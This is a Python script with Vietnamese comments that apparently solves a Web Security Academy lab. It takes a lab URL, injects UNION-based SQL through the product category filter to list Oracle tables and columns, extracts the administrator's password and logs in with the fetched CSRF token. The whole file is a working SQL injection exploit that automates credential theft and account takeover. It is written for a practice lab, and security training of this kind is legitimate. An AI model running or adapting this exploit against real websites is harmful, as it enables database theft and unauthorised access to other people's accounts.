import requests
from bs4 import BeautifulSoup

url = input("Nhập URL (https://xxxxx.web-security-academy.net): ").strip().rstrip("/")
s = requests.Session()

# 1. Tìm bảng USERS_
r = s.get(f"{url}/filter?category=Gifts'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--")
soup = BeautifulSoup(r.text, "html.parser")
random = next((th.text.strip().split("_", 1)[1] for th in soup.find_all("th") if th.text.strip().startswith("USERS_")), None)

# 2. Tìm cột USERNAME_ và PASSWORD_
r = s.get(f"{url}/filter?category=Gifts'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_{random}'--")
soup = BeautifulSoup(r.text, "html.parser")
cols = [th.text.strip() for th in soup.find_all("th")]
random1 = next((c.split("_", 1)[1] for c in cols if c.startswith("USERNAME_")), None)
random2 = next((c.split("_", 1)[1] for c in cols if c.startswith("PASSWORD_")), None)

# 3. Lấy mật khẩu
r = s.get(f"{url}/filter?category=Gifts'+UNION+SELECT+USERNAME_{random1}||':'||PASSWORD_{random2},NULL+FROM+USERS_{random}--")
soup = BeautifulSoup(r.text, "html.parser")
password = next((th.text.strip().split(":", 1)[1] for th in soup.find_all("th") if th.text.strip().startswith("administrator:")), None)

# 4. Đăng nhập
if password:
    r = s.get(f"{url}/login")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
    data = {"csrf": csrf, "username": "administrator", "password": password}
    r = s.post(f"{url}/login", data=data)
    print("✅ Đăng nhập thành công!" if "Welcome" in r.text else "❌ Đăng nhập thất bại.")
else:
    print("❌ Không tìm thấy mật khẩu administrator.")
